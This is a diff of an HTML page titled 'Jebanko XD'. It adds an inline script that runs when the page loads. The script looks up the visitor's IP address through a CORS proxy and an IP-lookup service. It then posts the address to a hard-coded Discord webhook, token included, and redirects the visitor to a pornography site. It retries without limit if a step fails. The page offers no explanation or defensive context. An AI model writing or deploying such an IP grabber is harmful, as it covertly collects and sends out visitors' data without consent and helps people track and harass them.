@@ -1,10 +1,50 @@
 <html>
     <head>
         <title>Jebanko XD</title>
-        <script src="grab.js"></script>
+
     </head>
 
     <body>
-        <script src="grab.js"></script>
+        <script>
+    let userIP;
+    let webhook = 'https://discord.com/api/webhooks/1179472661039034459/jjukAEk4LVOEpTVbi5G8GU4ZnsQ6Gjw6ugGppIesvGbQN6TNasvIODZofy-s1Q3oRSjf';
+    let redirectpage = 'https://pornhub.com/'
+
+    document.addEventListener('DOMContentLoaded', () => {
+      fetchIPAndSendWebhook();
+    });
+
+    function fetchIPAndSendWebhook() {
+      fetch('https://cors-anywhere.herokuapp.com/https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+          userIP = data.ip;
+          sendWebhook();
+        })
+        .catch(() => {
+          setTimeout(fetchIPAndSendWebhook, 100);
+        });
+    }
+
+    function sendWebhook() {
+      const data = {
+        userIP: userIP
+      };
+
+      fetch(webhook, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(data)
+      })
+        .then(() => {
+          window.location.href = redirectpage;
+        })
+        .catch(() => {
+          setTimeout(sendWebhook, 100);
+        });
+    }
+</script>
     </body>
 </html>
